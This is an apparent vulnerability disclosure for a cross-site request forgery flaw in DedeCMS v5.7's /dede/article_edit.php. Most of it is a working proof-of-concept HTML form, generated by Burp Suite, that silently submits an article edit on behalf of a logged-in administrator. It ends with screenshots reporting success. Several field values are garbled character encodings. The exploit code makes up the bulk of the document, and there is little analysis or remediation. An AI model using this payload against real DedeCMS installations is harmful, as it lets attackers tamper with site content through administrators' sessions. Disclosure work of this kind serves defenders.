target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /dede/article_edit.php

![1](https://github.com/itsqian797/cms/assets/161734504/de01a0b4-f3bc-469c-87de-a92179823d4b)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/src/dede/article_edit.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="dopost" value="save" />
      <input type="hidden" name="channelid" value="1" />
      <input type="hidden" name="id" value="2" />
      <input type="hidden" name="title" value="�&#128;&#138;�&#174;鸿&#175;&#173;�&#128;&#139;�&#183;�&#173;&#166;�&#128;&#140;" />
      <input type="hidden" name="shorttitle" value="�&#128;&#138;�&#174;鸿&#175;&#173;�&#128;&#139;�&#183;�&#173;&#166;�&#128;&#140;" />
      <input type="hidden" name="flags&#91;&#93;" value="h" />
      <input type="hidden" name="flags&#91;&#93;" value="c" />
      <input type="hidden" name="flags&#91;&#93;" value="p" />
      <input type="hidden" name="redirecturl" value="" />
      <input type="hidden" name="tags" value="" />
      <input type="hidden" name="weight" value="1" />
      <input type="hidden" name="picname" value="http&#58;&#47;&#47;www&#46;dedecms&#46;com&#47;demoimg&#47;uploads&#47;210823&#47;1&#45;210R31F312413&#46;png" />
      <input type="hidden" name="source" value="�&#156;&#159;&#165;" />
      <input type="hidden" name="writer" value="admin" />
      <input type="hidden" name="typeid" value="2" />
      <input type="hidden" name="typeid2" value="" />
      <input type="hidden" name="dede&#95;addonfields" value="" />
      <input type="hidden" name="remote" value="1" />
      <input type="hidden" name="autolitpic" value="1" />
      <input type="hidden" name="body" value="cs" />
      <input type="hidden" name="picinfook257" value="�&#128;&#138;�&#174;鸿&#175;&#173;�&#128;&#139;�&#183;�&#173;&#166;�&#128;&#140;" />
      <input type="hidden" name="voteid" value="0" />
      <input type="hidden" name="notpost" value="0" />
      <input type="hidden" name="click" value="125" />
      <input type="hidden" name="sortup" value="0" />
      <input type="hidden" name="color" value="" />
      <input type="hidden" name="arcrank" value="0" />
      <input type="hidden" name="ishtml" value="1" />
      <input type="hidden" name="pubdate" value="2024&#45;03&#45;01&#32;11&#58;04&#58;59" />
      <input type="hidden" name="money" value="0" />
      <input type="hidden" name="keywords" value="�&#128;&#138;&#44;�&#174;鸿&#175;&#173;&#44;�&#128;&#139;&#44;�&#173;&#166;�&#128;&#140;&#44;�&#173;&#144;�&#155;&#176;&#44;�&#173;&#166;�&#128;&#140;�&#151;&#182;�&#185;&#160;�&#185;&#139;&#44;�&#184;&#141;浜&#166;&#44;�&#175;&#180;&#44;�&#185;&#142;&#44;" />
      <input type="hidden" name="description" value="�&#173;&#144;�&#155;&#176;�&#188;&#154;�&#173;&#166;�&#128;&#140;�&#151;&#182;�&#185;&#160;�&#185;&#139;�&#188;&#140;�&#184;&#141;浜&#166;�&#175;&#180;�&#185;&#142;�&#188;&#159;�&#156;&#137;�&#156;&#139;�&#135;&#191;&#156;�&#150;&#185;�&#157;&#165;�&#188;&#140;�&#184;&#141;浜&#166;�&#185;&#144;�&#185;&#142;�&#188;&#159;浜轰&#184;&#141;�&#159;&#165;�&#128;&#140;�&#184;&#141;�&#132;&#160;�&#188;&#140;�&#184;&#141;浜&#166;�&#144;&#155;�&#173;&#144;�&#185;&#142;�&#188;&#159;&#32;�&#173;&#148;�&#173;&#144;�&#175;&#180;�&#188;&#154;�&#187;&#143;�&#184;&#184;�&#173;&#166;�&#185;&#160;�&#188;&#140;�&#184;&#141;�&#185;&#159;�&#150;&#156;�&#130;&#166;�&#144;&#151;�&#188;&#159;�&#191;&#156;�&#150;&#185;�&#157;&#165;浜&#134;�&#156;&#139;�&#143;&#139;�&#188;&#140;�&#184;&#141;�&#185;&#159;�&#191;&#171;�&#185;&#144;�&#144;&#151;�&#188;&#159;�&#190;&#151;�&#184;&#141;�&#136;&#176;�&#144;&#134;�&#167;&#163;�&#128;&#140;�&#184;&#141;�&#128;&#168;�&#129;&#168;�&#188;&#140;�&#184;&#141;�&#185;&#159;�&#152;&#175;�&#144;&#155;" />
      <input type="hidden" name="filename" value="" />
      <input type="hidden" name="templet" value="" />
      <input type="hidden" name="imageField&#46;x" value="20" />
      <input type="hidden" name="imageField&#46;y" value="16" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>



```

![2](https://github.com/itsqian797/cms/assets/161734504/c3765866-f7f2-451b-993a-da8f5aeff40a)


Successed

![3](https://github.com/itsqian797/cms/assets/161734504/f0fa2ad9-78eb-45d7-92d7-c0dc72489c9e)

